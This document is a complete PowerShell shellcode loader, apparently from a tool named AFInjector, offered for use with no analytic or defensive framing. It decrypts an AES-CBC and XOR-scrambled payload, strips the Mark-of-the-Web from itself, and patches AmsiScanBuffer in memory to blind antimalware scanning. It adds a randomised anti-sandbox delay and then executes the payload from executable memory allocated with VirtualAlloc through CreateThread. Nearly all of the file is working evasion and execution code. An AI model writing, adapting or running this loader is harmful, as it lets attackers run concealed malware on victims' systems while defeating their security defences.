# AFInjector PowerShell Launcher with AES-CBC Decryption
# This script reads metadata and decrypts the payload dynamically

param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,
    
    [Parameter(Mandatory=$true)]
    [string]$MetadataPath
)

$ErrorActionPreference = 'Stop'

Write-Host "[+] AFInjector PowerShell Launcher Started" -ForegroundColor Green

try {
    # 1. Read metadata file
    Write-Host "[+] Reading encryption metadata..." -ForegroundColor Cyan
    $metadata = Get-Content $MetadataPath | ConvertFrom-StringData
    
    $aesKey = $metadata.AES_KEY
    $aesIV = $metadata.AES_IV
    $scrambleByte = $metadata.SCRAMBLE_BYTE
    $payloadType = $metadata.PAYLOAD_TYPE
    
    Write-Host "    AES Key: $aesKey" -ForegroundColor Gray
    Write-Host "    AES IV: $aesIV" -ForegroundColor Gray
    Write-Host "    Scramble Byte: 0x$scrambleByte" -ForegroundColor Gray
    Write-Host "    Payload Type: $payloadType" -ForegroundColor Gray

    # 2. Read encrypted payload
    Write-Host "[+] Reading encrypted payload..." -ForegroundColor Cyan
    $encPayload = [System.IO.File]::ReadAllBytes($PayloadPath)
    Write-Host "    Payload size: $($encPayload.Length) bytes" -ForegroundColor Gray

    # 3. Convert hex strings to bytes
    $keyBytes = [System.Convert]::FromHexString($aesKey)
    $ivBytes = [System.Convert]::FromHexString($aesIV)
    $scrambleValue = [System.Convert]::ToByte($scrambleByte, 16)

    # 4. AES-CBC Decryption
    Write-Host "[+] Decrypting with AES-CBC..." -ForegroundColor Cyan
    
    # Create AES object
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Create decryptor
    $decryptor = $aes.CreateDecryptor()
    
    # Decrypt payload
    $decryptedBytes = $decryptor.TransformFinalBlock($encPayload, 0, $encPayload.Length)
    $decryptor.Dispose()
    $aes.Dispose()
    
    Write-Host "    Decrypted size: $($decryptedBytes.Length) bytes" -ForegroundColor Gray

    # 5. Post-decryption XOR scramble
    Write-Host "[+] Applying post-decryption XOR scramble..." -ForegroundColor Cyan
    $finalPayload = [byte[]]::new($decryptedBytes.Length)
    for ($i = 0; $i -lt $decryptedBytes.Length; $i++) {
        $finalPayload[$i] = $decryptedBytes[$i] -bxor $scrambleValue
    }
    
    Write-Host "    Final payload size: $($finalPayload.Length) bytes" -ForegroundColor Gray

    # 6. Verify payload type
    if ($payloadType -eq "pe_file" -and $finalPayload.Length -ge 2) {
        if ($finalPayload[0] -eq 0x4D -and $finalPayload[1] -eq 0x5A) {
            Write-Host "[+] PE file signature verified (MZ)" -ForegroundColor Green
        } else {
            Write-Host "[!] Warning: Expected PE file but signature not found" -ForegroundColor Yellow
        }
    }

    # 7. Anti-sandbox/evasion techniques
    Write-Host "[+] Applying evasion techniques..." -ForegroundColor Cyan
    
    # MOTW removal
    $me = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    if ($me) {
        Unblock-File -Path $me -EA SilentlyContinue
        Remove-Item -Path $me -Stream Zone.Identifier -EA SilentlyContinue
    }
    
    # AMSI bypass (simplified)
    try {
        $amsiCode = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        uint old = 0;
        VirtualProtect(addr, (UIntPtr)6, 0x40, ref old);
        Marshal.Copy(new byte[]{0x31, 0xC0, 0xC3}, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, ref old);
    }
}
"@
        Add-Type -TypeDefinition $amsiCode -Language CSharp
        [Amsi]::Patch()
        Write-Host "    AMSI bypass applied" -ForegroundColor Gray
    } catch {
        Write-Host "    AMSI bypass failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # 8. Anti-sandbox delay
    $delaySeconds = Get-Random -Minimum 15 -Maximum 45
    Write-Host "[+] Anti-sandbox delay: $delaySeconds seconds..." -ForegroundColor Cyan
    Start-Sleep -Seconds $delaySeconds

    # 9. Execute shellcode
    Write-Host "[+] Executing payload..." -ForegroundColor Red
    
    $runnerCode = @"
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);

    public static void ExecuteAndWait(byte[] sc, uint timeoutMs) {
        IntPtr region = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, region, sc.Length);
        uint tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, region, IntPtr.Zero, 0, out tid);
        if (hThread != IntPtr.Zero) {
            WaitForSingleObject(hThread, timeoutMs);
            CloseHandle(hThread);
        }
    }
}
"@
    Add-Type -TypeDefinition $runnerCode -Language CSharp
    
    Write-Host "[+] Handing control to payload (waiting 60s)..." -ForegroundColor Magenta
    [Runner]::ExecuteAndWait($finalPayload, 60000)
    
    Write-Host "[+] Payload execution completed" -ForegroundColor Green

} catch {
    Write-Host "[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
}

Write-Host "[+] Launcher exiting" -ForegroundColor Green
